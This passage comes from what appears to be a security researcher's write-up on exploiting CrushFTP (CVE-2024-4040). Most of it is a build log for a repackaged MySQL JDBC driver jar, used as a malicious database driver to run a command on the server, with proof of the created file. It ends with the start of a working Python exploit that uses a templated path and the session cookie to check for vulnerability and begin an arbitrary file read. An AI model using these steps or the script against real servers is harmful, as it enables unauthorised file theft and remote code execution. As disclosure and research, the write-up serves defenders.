</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Statement.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 26505<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 12676<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/StringUtils.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 17636<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 8909<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/TimeUtil.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 34225<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 16486<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/UpdatableResultSet.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 25663<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 11104<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Util$RandStructcture.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 565<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 348<span style="color:#f92672">)(</span>deflated 38%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Util.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5155<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2894<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/VersionedStringProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2174<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1225<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/WatchableOutputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 794<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 417<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/WatchableWriter.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 698<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 380<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/WriterWatcher.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 183<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 143<span style="color:#f92672">)(</span>deflated 21%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/3-0-Compat.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 413<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 269<span style="color:#f92672">)(</span>deflated 34%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/clusterBase.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 100<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 88<span style="color:#f92672">)(</span>deflated 12%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/fullDebug.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 146<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 110<span style="color:#f92672">)(</span>deflated 24%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/maxPerformance.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 775<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 419<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/configs/solarisMaxPerformance.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 248<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 169<span style="color:#f92672">)(</span>deflated 31%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLDataException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 829<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 414<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLIntegrityConstraintViolationException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 901<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 433<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLInvalidAuthorizationSpecException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 889<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 434<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLNonTransientConnectionException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 883<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 421<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLNonTransientException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 822<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 417<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLSyntaxErrorException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 850<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 422<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLTimeoutException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 977<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 487<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLTransactionRollbackException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 871<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 423<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLTransientConnectionException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 871<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 419<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/exceptions/MySQLTransientException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 813<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 407<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/c3p0/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/c3p0/MysqlConnectionTester.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2856<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1427<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/jboss/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/jboss/ExtendedMysqlExceptionSorter.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 804<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 457<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/integration/jboss/MysqlValidConnectionChecker.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2687<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1351<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/CallableStatementWrapper.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 18436<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 4464<span style="color:#f92672">)(</span>deflated 75%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/ConnectionWrapper.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 10762<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 3702<span style="color:#f92672">)(</span>deflated 65%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlConnectionPoolDataSource.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1259<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 531<span style="color:#f92672">)(</span>deflated 57%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlDataSource.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5785<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2512<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlDataSourceFactory.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3186<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1625<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlPooledConnection.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3122<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1467<span style="color:#f92672">)(</span>deflated 53%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlXAConnection.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 8107<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 4102<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlXADataSource.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1396<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 622<span style="color:#f92672">)(</span>deflated 55%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlXAException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1156<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 628<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/MysqlXid.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1510<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 883<span style="color:#f92672">)(</span>deflated 41%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/PreparedStatementWrapper.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 9557<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2923<span style="color:#f92672">)(</span>deflated 69%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/StatementWrapper.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 8635<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2843<span style="color:#f92672">)(</span>deflated 67%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/SuspendableXAConnection.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3889<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1679<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/jdbc2/optional/WrapperBase.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 897<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 504<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/CommonsLogger.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2725<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 911<span style="color:#f92672">)(</span>deflated 66%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/Jdk14Logger.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4520<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1852<span style="color:#f92672">)(</span>deflated 59%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/Log.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 489<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 261<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/Log4JLogger.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2752<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 987<span style="color:#f92672">)(</span>deflated 64%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/LogFactory.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3130<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1472<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/LogUtils.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3274<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1891<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/NullLogger.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1908<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 561<span style="color:#f92672">)(</span>deflated 70%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/log/StandardLogger.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4161<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1727<span style="color:#f92672">)(</span>deflated 58%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/profiler/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/profiler/ProfileEventSink.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1835<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 928<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/profiler/ProfilerEvent.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5720<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2800<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/BaseBugReport.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2200<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1089<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/ErrorMappingsDocGenerator.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 581<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 348<span style="color:#f92672">)(</span>deflated 40%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/LRUCache.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 700<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 454<span style="color:#f92672">)(</span>deflated 35%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/PropertiesDocGenerator.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 721<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 423<span style="color:#f92672">)(</span>deflated 41%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/ReadAheadInputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4549<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2490<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/ResultSetUtil.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1718<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 977<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/ServerController.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4914<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2499<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/TimezoneDump.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1825<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 989<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/util/VersionFSHierarchyMaker.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3699<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2113<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: manifest.txt<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 36<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 38<span style="color:#f92672">)(</span>deflated -5%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/gjt/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/gjt/mm/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/gjt/mm/mysql/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/gjt/mm/mysql/Driver.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 699<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 459<span style="color:#f92672">)(</span>deflated 34%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: org/gjt/mm/mysql/Driver.java<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 575<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 307<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Once the jar is ready, we can now go back to the CrushSQL and configure the Database Driver file and save the settings. Once we clicked on “Test settings”, it will hang up for a second and throw the shown error but the command will be executed:</p>
<p><img src="/img/CrushFTP/Untitled_8.png" alt="Untitled"></p>
<p>We can see that the file has been created:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ζ ls -la /tmp/crushftp_pwned                                                                                                                                                                                        
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">0</span> May  <span style="color:#ae81ff">9</span> 07:22 /tmp/crushftp_pwned
</span></span></code></pre></div><p>I have made my own script which triggers the vulnerability and checks if the target CrushFTP is vulnerable or not and if it is, it will retrieve the specified file.</p>
<blockquote>
<p>Unfortunately, automating the RCE is not worth the effort in this case as it is multi-step process. Not that it cannot be automated with extra effort, it is just some dependency on the VFS share where you have uploaded the jar file have to be specified during the plugin configuration. It will not be scalable per se.</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_vulnerability</span>(url):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>        sess<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>        currentAuth <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;currentAuth&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Implement vulnerability check logic here</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Checking vulnerability for URL:&#34;</span>, url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/WebInterface/function/?command=zip&amp;c2f=&#34;</span><span style="color:#f92672">+</span>currentAuth<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;path={{user_name}}&amp;names=*&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;anonymous&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] URL: </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74"> is vulnerable to CVE 2024-4040&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[-] Not vulnerable!&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error occured: &#34;</span>, e)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_include_file_command</span>(url, filename):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Implement LFI logic here</span>
</span></span><span style="display:flex;"><span>    check_vulnerability(url)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Attempting to read file:&#34;</span>, filename)
